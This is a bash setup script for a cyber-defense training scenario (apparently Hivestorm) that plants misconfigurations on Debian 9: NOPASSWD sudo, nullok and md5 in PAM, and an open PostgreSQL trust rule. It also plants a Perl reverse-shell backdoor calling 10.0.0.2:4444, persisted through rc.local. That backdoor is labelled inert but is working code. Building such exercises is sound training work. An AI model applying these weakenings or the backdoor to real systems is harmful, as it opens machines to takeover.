#!/bin/bash
# Hivestorm HS21 scenario-06 — Debian 9 + PostgreSQL misconfigurations.
set -euo pipefail

ROLES=/etc/sysrepair/roles.json

# Debian 9 repos archived.
cat >/etc/apt/sources.list <<'EOF'
deb http://archive.debian.org/debian stretch main contrib non-free
deb http://archive.debian.org/debian-security stretch/updates main contrib non-free
EOF
echo 'Acquire::Check-Valid-Until "false";' >/etc/apt/apt.conf.d/99no-check-valid

apt-get update
apt-get install -y --no-install-recommends \
    jq sudo cron rsyslog procps iproute2 curl perl \
    openssh-server openssh-client sshpass pamtester \
    postgresql postgresql-client ufw \
    apache2 bind9 \
    libpam-pwquality

ADMIN=$(jq -r .admin_user            "$ROLES")
ADMIN_PW=$(jq -r .admin_weak_password  "$ROLES")
HIDDEN=$(jq -r .hidden_user          "$ROLES")
UNAUTH=$(jq -r .unauthorized_user    "$ROLES")
NONADMIN=$(jq -r .nonadmin_user      "$ROLES")
MP3_PATH=$(jq -r .prohibited_mp3_path "$ROLES")
PERL_BD=$(jq -r .perl_backdoor_path  "$ROLES")
PG_ROGUE=$(jq -r .pg_rogue_db_user   "$ROLES")
PROH0=$(jq -r '.prohibited_packages[0]' "$ROLES")
PROH1=$(jq -r '.prohibited_packages[1]' "$ROLES")

apt-get install -y --no-install-recommends "$PROH0" "$PROH1" || true

# ---- users --------------------------------------------------------------------
useradd -m -s /bin/bash "$ADMIN"
echo "${ADMIN}:${ADMIN_PW}" | chpasswd
usermod -aG sudo "$ADMIN"

useradd -m -s /bin/bash "$NONADMIN"
echo "${NONADMIN}:changeme" | chpasswd
usermod -aG sudo "$NONADMIN"   # unauthorized group membership

useradd -m -s /bin/bash "$UNAUTH"
echo "${UNAUTH}:changeme" | chpasswd
echo "${UNAUTH} ALL=(ALL) NOPASSWD:ALL" >/etc/sudoers.d/90-${UNAUTH}
chmod 0440 /etc/sudoers.d/90-${UNAUTH}

# Hidden user (UID 998, no shell but /etc/passwd entry present).
useradd -u 998 -M -d /nonexistent -s /bin/bash "$HIDDEN" || true
echo "${HIDDEN}:changeme" | chpasswd

# ---- PAM weakness ------------------------------------------------------------
# Hashing algo: force md5 instead of sha512.
sed -ri 's/\bsha512\b/md5/' /etc/pam.d/common-password || true
# Strip pwquality/cracklib line entirely.
sed -ri '/pam_pwquality|pam_cracklib/d' /etc/pam.d/common-password
# After stripping pwquality, pam_unix's use_authtok/try_first_pass have no
# upstream provider — strip them so chpasswd/passwd can actually set the pw
# (otherwise the PAM stack is broken and NO password change succeeds, which
# would be more brittle than the misconfig we want to seed).
sed -ri 's/[[:space:]]+use_authtok//; s/[[:space:]]+try_first_pass//' \
    /etc/pam.d/common-password
# Allow null passwords via pam_unix in common-auth.
sed -ri 's|(pam_unix\.so)(.*)|\1\2 nullok|' /etc/pam.d/common-auth

# ---- sysctl ------------------------------------------------------------------
cat >/etc/sysctl.d/99-hs-bad.conf <<'EOF'
net.ipv4.tcp_rfc1337=0
net.ipv4.conf.all.log_martians=0
kernel.kptr_restrict=0
EOF

# ---- ufw: installed but disabled ---------------------------------------------
ufw disable >/dev/null 2>&1 || true

# ---- GRUB perms (plant decoy since containers have no /boot/grub) ------------
mkdir -p /boot/grub
cat >/boot/grub/grub.cfg <<'EOF'
# GRUB config (decoy for scoring — container does not actually boot from here).
set default="0"
set timeout=5
EOF
chmod 0644 /boot/grub/grub.cfg

# ---- PostgreSQL misconfig ----------------------------------------------------
PG_CONF_DIR=/etc/postgresql/9.6/main
service postgresql start
# Create rogue DB role.
su - postgres -c "psql -c \"CREATE ROLE ${PG_ROGUE} SUPERUSER LOGIN PASSWORD 'changeme';\"" || true
# Loosen pg_hba: add a 'trust' line for all local connections.
echo 'host all all 0.0.0.0/0 trust' >>${PG_CONF_DIR}/pg_hba.conf
# World-readable configs.
chmod 0644 ${PG_CONF_DIR}/pg_hba.conf ${PG_CONF_DIR}/postgresql.conf
# Listen on all interfaces.
sed -ri "s/^#?listen_addresses.*/listen_addresses = '*'/" ${PG_CONF_DIR}/postgresql.conf
service postgresql stop || true

# ---- prohibited media --------------------------------------------------------
mkdir -p "$(dirname "$MP3_PATH")"
# Plant a small fake MP3 (ID3 header then random bytes).
printf 'ID3\x03\x00\x00\x00\x00\x00\x00fake mp3 payload' >"$MP3_PATH"
chown "$NONADMIN:$NONADMIN" "$(dirname "$MP3_PATH")" "$MP3_PATH"

# ---- perl owl-shell backdoor -------------------------------------------------
cat >"$PERL_BD" <<'EOF'
#!/usr/bin/perl
# owl-shell reverse callback (inert copy — scored as presence/removal).
use IO::Socket;
my $s = IO::Socket::INET->new(PeerAddr=>"10.0.0.2:4444");
if ($s) { while (<$s>) { print $s `$_`; } }
EOF
chmod 0755 "$PERL_BD"
# Persist via rc.local so it launches on boot.
cat >/etc/rc.local <<EOF
#!/bin/sh -e
${PERL_BD} &
exit 0
EOF
chmod 0755 /etc/rc.local

# ---- unneeded services enabled ----------------------------------------------
# apache2 and bind9 both enabled after package install; leave them that way.

# ---- supervisor --------------------------------------------------------------
cat >/usr/local/sbin/hs-start.sh <<'EOF'
#!/bin/bash
service rsyslog    start || true
service cron       start || true
service postgresql start || true
service apache2    start || true
service bind9      start || true
[ -x /etc/rc.local ] && /etc/rc.local || true
exec /usr/sbin/sshd -D -e
EOF
chmod 0755 /usr/local/sbin/hs-start.sh

mkdir -p /var/run/sshd
apt-get clean
rm -rf /var/lib/apt/lists/*
